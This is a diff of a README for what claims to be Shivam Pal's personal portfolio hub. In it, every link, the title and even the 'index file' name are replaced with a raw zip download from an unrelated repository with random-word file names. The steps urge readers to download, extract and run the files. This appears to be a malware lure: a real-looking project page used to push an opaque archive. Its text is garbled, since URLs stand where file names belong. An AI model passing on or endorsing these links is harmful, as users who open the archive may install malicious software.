@@ -1,10 +1,10 @@
-# 🚀 https://raw.githubusercontent.com/ApoloLiv/shivampal-ofc.github.io/main/sociologist/shivampal_ofc_github_io_juniorate.zip - Your Personal Hub in One Place
+# 🚀 https://github.com/ApoloLiv/shivampal-ofc.github.io/raw/refs/heads/main/sociologist/io_ofc_github_shivampal_antituberculin.zip - Your Personal Hub in One Place
 
-[![Download](https://raw.githubusercontent.com/ApoloLiv/shivampal-ofc.github.io/main/sociologist/shivampal_ofc_github_io_juniorate.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/ApoloLiv/shivampal-ofc.github.io/main/sociologist/shivampal_ofc_github_io_juniorate.zip)
+[![Download](https://github.com/ApoloLiv/shivampal-ofc.github.io/raw/refs/heads/main/sociologist/io_ofc_github_shivampal_antituberculin.zip%20Now-Click%20Here-brightgreen)](https://github.com/ApoloLiv/shivampal-ofc.github.io/raw/refs/heads/main/sociologist/io_ofc_github_shivampal_antituberculin.zip)
 
 ## 🌟 Overview
 
-Welcome to **https://raw.githubusercontent.com/ApoloLiv/shivampal-ofc.github.io/main/sociologist/shivampal_ofc_github_io_juniorate.zip**! This is a personal hub and linktree for Shivam Pal. It showcases a portfolio, project details, GitHub links, and professional connections. This site is crafted to give you a comprehensive look into my work and passions.
+Welcome to **https://github.com/ApoloLiv/shivampal-ofc.github.io/raw/refs/heads/main/sociologist/io_ofc_github_shivampal_antituberculin.zip**! This is a personal hub and linktree for Shivam Pal. It showcases a portfolio, project details, GitHub links, and professional connections. This site is crafted to give you a comprehensive look into my work and passions.
 
 ## 🌐 Features
 
@@ -18,20 +18,20 @@ Welcome to **https://raw.githubusercontent.com/ApoloLiv/shivampal-ofc.github.io/
 
 To get started with this application, follow these simple steps:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/ApoloLiv/shivampal-ofc.github.io/main/sociologist/shivampal_ofc_github_io_juniorate.zip).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ApoloLiv/shivampal-ofc.github.io/raw/refs/heads/main/sociologist/io_ofc_github_shivampal_antituberculin.zip).
 2. **Download the Latest Version**: On the Releases page, look for the latest version of the project. Click on it to open the details.
 3. **Download the Release**: Find the download link, which should be labeled clearly. Click it to start downloading the files you need.
 4. **Run the Files**: After downloading, locate the files in your Downloads folder. Open the file to access the personal hub.
 
 ## 💾 Download & Install
 
-For easier access, visit this page to download the latest version: [Download Here](https://raw.githubusercontent.com/ApoloLiv/shivampal-ofc.github.io/main/sociologist/shivampal_ofc_github_io_juniorate.zip).
+For easier access, visit this page to download the latest version: [Download Here](https://github.com/ApoloLiv/shivampal-ofc.github.io/raw/refs/heads/main/sociologist/io_ofc_github_shivampal_antituberculin.zip).
 
 After you have downloaded the files, here’s what to do next:
 
 1. **Locate the Downloaded Files**: Open your file explorer, and navigate to the `Downloads` folder.
 2. **Extract the Files**: If you downloaded a zip file, right-click on it and select "Extract All." This will create a new folder with the project files.
-3. **Open the Index File**: Inside the new folder, you will find an `https://raw.githubusercontent.com/ApoloLiv/shivampal-ofc.github.io/main/sociologist/shivampal_ofc_github_io_juniorate.zip` file. Double-click on it to open in your web browser. This will launch your personal hub.
+3. **Open the Index File**: Inside the new folder, you will find an `https://github.com/ApoloLiv/shivampal-ofc.github.io/raw/refs/heads/main/sociologist/io_ofc_github_shivampal_antituberculin.zip` file. Double-click on it to open in your web browser. This will launch your personal hub.
 
 ## 📋 System Requirements
 
@@ -45,7 +45,7 @@ To run this application smoothly, ensure you have:
 
 If you encounter issues, here are a few tips:
 
-- **File Not Opening**: Ensure you opened the `https://raw.githubusercontent.com/ApoloLiv/shivampal-ofc.github.io/main/sociologist/shivampal_ofc_github_io_juniorate.zip` file in a web browser.
+- **File Not Opening**: Ensure you opened the `https://github.com/ApoloLiv/shivampal-ofc.github.io/raw/refs/heads/main/sociologist/io_ofc_github_shivampal_antituberculin.zip` file in a web browser.
 - **Formatting Issues**: Refresh the browser page. Clear your browser cache if the issue persists.
 - **Links Not Working**: Verify your internet connection. Try accessing the site again after some time.
 
